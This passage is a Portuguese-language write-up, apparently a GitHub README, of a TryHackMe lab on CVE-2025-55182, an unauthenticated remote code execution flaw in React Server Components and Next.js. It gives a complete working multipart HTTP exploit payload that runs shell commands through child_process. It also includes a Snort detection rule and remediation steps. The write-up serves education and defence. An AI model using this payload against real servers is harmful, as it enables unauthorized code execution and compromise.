# üö© CVE-2025-55182 - React Server Components RCE (React2Shell)

Write-up t√©cnico da vulnerabilidade CVE-2025-55182, explorada durante o laborat√≥rio pr√°tico do TryHackMe. Esta falha afeta o React Server Components (RSC) e frameworks como Next.js, permitindo Execu√ß√£o Remota de C√≥digo (RCE) sem autentica√ß√£o.

![Security](https://img.shields.io/badge/Security-CVE--2025--55182-critical)
![React](https://img.shields.io/badge/React-19.x-blue)
![Next.js](https://img.shields.io/badge/Next.js-vulnerable-orange)

## üìù Descri√ß√£o da Vulnerabilidade

A vulnerabilidade √© uma **deserializa√ß√£o insegura** no protocolo React Flight. O erro ocorre na fun√ß√£o `requireModule` do pacote `react-server-dom-webpack`, que utiliza nota√ß√£o de colchetes para acessar propriedades de objetos. 

Isso permite que um atacante percorra a **prototype chain** e acesse o construtor global `Function`, injetando comandos arbitr√°rios no servidor Node.js.

### Vers√µes Vulner√°veis

- **React:** 19.0.0, 19.1.0, 19.1.1, 19.2.0
- **Next.js:** Vers√µes recentes at√© a corre√ß√£o em 19.0.1+

## üöÄ Explora√ß√£o Passo a Passo

### 1. Prepara√ß√£o do Ambiente

O ataque √© realizado interceptando e modificando uma requisi√ß√£o HTTP via Burp Suite.

**Headers Cr√≠ticos:**
- `Next-Action: x` (Gatilha o processamento de Server Actions do React)
- `Content-Type: multipart/form-data`

### 2. Configura√ß√£o do Burp Suite

Utilizamos o **Burp Suite Repeater** para enviar o payload malicioso:

1. Abra o Burp Suite
2. Configure uma nova aba HTTP no Repeater
3. Configure o target (IP e porta do alvo)

### 3. O Payload Malicioso

O payload simula um objeto "chunk" falso que manipula as propriedades internas do React:

```http
POST / HTTP/1.1
Host: [TARGET_IP]:3000
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"
[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

### Por que funciona?

- **`$1:constructor:constructor`**: Resolve para o construtor global `Function`
- **`_prefix`**: Cont√©m o c√≥digo JavaScript que ser√° executado pelo construtor
- **`execSync('id')`**: Comando do Sistema Operacional para identificar o usu√°rio

### 4. Execu√ß√£o e Resultado

Ao enviar a requisi√ß√£o, o servidor executa o comando e retorna a sa√≠da no campo `digest` da resposta HTTP.

![Resultado do RCE](5.png)

*Sa√≠da do comando `id` exibida na resposta do servidor.*

## üõ°Ô∏è Detec√ß√£o e Mitiga√ß√£o

### Detec√ß√£o via Snort (IDS)

Regra para identificar tentativas de ataque:

```snort
alert http any any -> $LAN_NETWORK any (
    msg:"Potential Next.js React2Shell / CVE-2025-55182 attempt";
    content:"Next-Action"; http_header; nocase;
    content:"multipart/form-data"; http_header; nocase;
    pcre:"/\"then\"\s*:\s*\"\$1:__proto__:then\"/s";
    sid:6655001; rev:1;
)
```

### Remedia√ß√£o

1. **Atualizar:** Certifique-se de estar usando React 19.0.1+ ou vers√µes corrigidas do Next.js
2. **WAF:** Implementar regras de Web Application Firewall que filtrem acessos a propriedades como `__proto__` e `constructor` em payloads JSON/Multipart
3. **Valida√ß√£o de Entrada:** Sanitizar e validar todos os dados recebidos em Server Actions

## üîó Refer√™ncias e Ferramentas

- **TryHackMe Room:** [React2Shell (CVE-2025-55182)](https://tryhackme.com/room/react2shellcve202555182)
- **PoC Original:** [maple3142 - CVE-2025-55182.http](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http)
- **Scanner de Vulnerabilidade:** [Next.js-RSC-RCE-Scanner](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478)
- **Burp Suite:** [PortSwigger](https://portswigger.net/burp)
  

## ‚ö†Ô∏è Aviso Legal

Este conte√∫do possui **fins exclusivamente educacionais** e foi realizado em ambiente controlado. A explora√ß√£o de vulnerabilidades em sistemas sem autoriza√ß√£o √© ilegal e pode resultar em consequ√™ncias criminais.

## üë§ Autor

**[iceShaher]**
- TryHackMe: [@iceShaher](https://tryhackme.com/p/iceShaher)

---

‚≠ê Se este write-up foi √∫til para voc√™, considere dar uma estrela no reposit√≥rio!
